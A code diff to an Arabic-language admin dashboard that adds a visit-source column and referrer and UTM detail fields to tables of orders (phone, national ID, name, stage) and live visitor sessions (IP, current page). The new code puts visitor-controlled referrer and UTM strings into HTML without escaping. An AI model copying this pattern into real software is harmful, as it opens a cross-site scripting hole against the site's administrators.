@@ -330,6 +330,7 @@
                     <thead>
                         <tr>
                             <th>الدولة</th>
+                            <th>مصدر الزيارة</th>
                             <th>الهاتف</th>
                             <th>الهوية</th>
                             <th>المرحلة</th>
@@ -356,6 +357,7 @@
                     <thead>
                         <tr>
                             <th>الدولة</th>
+                            <th>مصدر الزيارة</th>
                             <th>IP</th>
                             <th>الصفحة الحالية</th>
                             <th>آخر نشاط</th>
@@ -526,9 +528,12 @@
                     `;
                 }
 
+                const sourceText = order.visitSource && order.visitSource !== 'Direct' ? order.visitSource : (order.referrer ? order.referrer.substring(0, 30) : 'مباشر');
+
                 return `
                     <tr class="${rowClass}">
                         <td>${flag} ${order.country || 'غير معروف'}</td>
+                        <td style="font-size:11px;color:#555;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${order.visitSource || ''} ${order.referrer || ''}">${sourceText}</td>
                         <td>${order.personalData?.phone || '-'}</td>
                         <td>${order.personalData?.id_number || '-'}</td>
                         <td><span class="stage-badge stage-${state.stage || 'unknown'}">${stageLabel}</span></td>
@@ -603,14 +608,25 @@
                 const tbody = document.getElementById('visitorTableBody');
                 
                 if (data.sessions.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;">لا توجد زيارات نشطة حالياً</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:20px;">لا توجد زيارات نشطة حالياً</td></tr>';
                 } else {
                     tbody.innerHTML = data.sessions.map(s => {
                         const flag = countryFlags[s.country] || '🌍';
                         const lastSeen = new Date(s.last_activity).toLocaleTimeString('ar');
+                        let visitSrc = 'مباشر';
+                        try {
+                            if (s.utm_source) {
+                                visitSrc = s.utm_source + (s.utm_medium ? '/' + s.utm_medium : '');
+                            } else if (s.referrer) {
+                                visitSrc = new URL(s.referrer).hostname.replace('www.','').substring(0,25);
+                            }
+                        } catch(e) {
+                            visitSrc = s.referrer ? s.referrer.substring(0,25) : 'مباشر';
+                        }
                         return `
                             <tr>
                                 <td>${flag} ${s.country || 'غير معروف'}</td>
+                                <td style="font-size:11px;color:#555">${visitSrc}</td>
                                 <td>${s.ip}</td>
                                 <td><code style="background:#eee;padding:2px 5px;border-radius:4px;">${s.current_page}</code></td>
                                 <td>${lastSeen}</td>
@@ -687,6 +703,14 @@
                         <strong>🌍 الدولة:</strong>
                         <span>${countryFlags[order.country] || ''} ${order.country || 'غير معروف'}</span>
                     </div>
+                    <div class="detail-item">
+                        <strong>🔗 مصدر الزيارة:</strong>
+                        <span style="color:#f57c00;font-weight:bold">${order.visitSource && order.visitSource !== 'Direct' ? order.visitSource : (order.referrer ? order.referrer.substring(0, 80) : 'مباشر')}</span>
+                    </div>
+                    ${order.referrer ? `<div class="detail-item"><strong>📎 الرابط السابق (Referrer):</strong><span style="font-size:11px;color:#555;word-break:break-all">${order.referrer}</span></div>` : ''}
+                    ${order.utmSource ? `<div class="detail-item"><strong>📢 UTM Source:</strong><span>${order.utmSource}</span></div>` : ''}
+                    ${order.utmMedium ? `<div class="detail-item"><strong>📢 UTM Medium:</strong><span>${order.utmMedium}</span></div>` : ''}
+                    ${order.utmCampaign ? `<div class="detail-item"><strong>📢 UTM Campaign:</strong><span>${order.utmCampaign}</span></div>` : ''}
                     <div class="detail-item">
                         <strong>👤 الاسم:</strong>
                         <span>${order.personalData?.fullname || '-'}</span>
